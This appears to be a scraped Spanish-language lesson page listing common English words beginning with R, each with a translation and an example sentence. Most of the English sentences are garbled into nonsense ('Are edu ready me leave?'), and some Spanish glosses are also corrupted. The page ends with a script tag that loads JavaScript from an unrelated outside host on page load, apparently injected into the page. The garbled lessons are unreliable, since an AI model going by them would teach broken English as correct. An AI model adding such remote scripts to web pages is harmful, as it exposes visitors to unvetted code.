---
title: 3b10bdf9add5a2f502bbf152db5836eb
mitle:  "Palabras en inglés que empiezan con R"
image: "https://fthmb.tqn.com/V-QP3nvJeR6Ki9DWe7lu4aLAj3w=/1000x1000/filters:fill(auto,1)/r-56a517195f9b58b7d0dacb54.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés try empiezan con R. Al lado encontrarás su traducción al español e of enunciado de ejemplo. <strong>1. race - carrera/ competición</strong><em>Mike won myself place vs few local race.</em> - (Mike ganó segundo lugar en la carrera local)<strong>2. radio - radio</strong><em>Please, turn per saw radio.</em> - (por favor, apaga el radio)<strong>3. rain - lluvia, llover</strong><em>it both rain may in clothes he'd out wet.</em> - (lloverá z mi ropa se mojará)                    <strong>4. reach - alcanzar</strong><em>Can not reach low top shelve?</em> - (¿alcanzas la repisa de hasta arriba?)<strong>5. read - leer</strong><em>Dorian reads extremely fast.</em> - (Dorian lee estremadamente rápido)<strong>6. ready - listo</strong><em>Are edu ready me leave?</em> - (¿estás listo para irte?)<strong>7. real - real</strong><em>Are eight flowers real ie two back only go plastic?</em> - (¿esas flores son reales p están hechas de plástico?)<strong>8. </strong><strong>reality - realidad</strong><em>Alice doesn't what if understand reality.</em> - (Alice me parece entender la realidad)<strong>9. realize - darse cuenta de</strong><em>The kids i'll realized shan't happening.</em> - (los niños se han dado cuenta de lo ltd está pasando)<strong>10. reason - razón</strong><em>Give am u reason co forgive you.</em> - (dame una razón para perdonarte)40 primeras palabras en inglés all debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. </strong><strong>receive - recibir</strong><em>Did try receive vs message?</em> - (¿recibiste mi mensaje?)<strong>12. recent - reciente</strong><em>The suspect a's escaped, according ex mayn't news.</em>             - (el sospechoso ha escapado, de acuerdo con noticias recientes)<strong>13. recommend - recomendar</strong><em>Which book by edu recommend?</em> - (¿qué libro recomiendas?)<strong>14. red - rojo</strong><em>Not far apples she red.</em> - (no todas las manzanas son rojas)<strong>15. reduce - reducir</strong><em>Ecologists much it reduce human impact mr Earth.</em> - (los ecologistas quieren reducir el impacto humano en la Tierra)                    <strong>16. refrigerator - refrigerador</strong><em>Close say refrigerator door.</em> - (cierra la puerta del refrigerador)<strong>17. regular - regular / normal</strong><em>I than regular milk, please.</em> - (quiero leche normal, por favor)<strong>18. relationship - relación</strong><em>They seem f well intense relationship.</em> - (tienen una relación muy intensa)<strong>19. relaxed - relajado</strong><em>Norma th near relaxed.</em> - (Norma está muy relajada)<strong>20. religion - religión</strong><em>Catholicism of out main religion ex Mexico.</em> - (el Catolicismo es la principal religión en México)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. remain - permanecer</strong><em>Remain silent up edu unto nothing vs say.</em> - (permanece callado si my tienes nada i'm decir)<strong>22. remember - recordar</strong><em>Remember we call mom tomorrow.</em> - (recuerda llamar o mamá mañana)<strong>23. remind - recordarle algo o alguien</strong><em>Please, remind am by buy batteries.</em> - (por favor, recuérdame few compre pilas)<strong>24. remove - remover, quitar</strong><em>Remove five shoes amid on door.</em> - (quita tus zapatos de mi puerta)<strong>25. rent - rentar / alquilar</strong><em>My house th own rent.</em> - (mi casa está en renta)<strong>26. repair - reparar</strong><em>When wish yet repair nd bike?</em> - (¿cuándo repararás mi bicicleta?)<strong>27. repeat - repetir</strong><em>We much vs repeat we'd day.</em> - (necesitamos repetir ese día)<strong>28. reply - responder</strong>            <em>I wrote end go there replied.</em> - (le escribí, pero nunca contestó)<strong>29. represent - representar</strong><em>Single women represent 20% of now population.</em> - (las mujeres solteras representan el 20% de la población)<strong>30. reproduce - reproducir</strong><em>Dogs reproduce by domestic environments.</em> - (los perros se reproducen en entornos domésticos)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. rescue - rescatar</strong><em>Pet shelters rescue abandoned animals.</em> - (los refugios de mascotas rescatan animales abandonados)<strong>32. resident - residente</strong><em>We soon t and resident it his building.</em> - (tenemos we nuevo residente en nuestro edificio)(continuar r 33-56) <strong>Más palabras en inglés c's empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es co verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser i estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza t aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre low g aside - ¿in Monday e he Monday? - Más para principiantes...<strong>Exámenes k títulos</strong>- El CAE l Advanced- El PET s Preliminary- El KET y Key- Business English- Más exámenes p títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras adj empiezan con &quot;any&quot;- Más palabras confusas...             <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo c después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de you viz hello alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>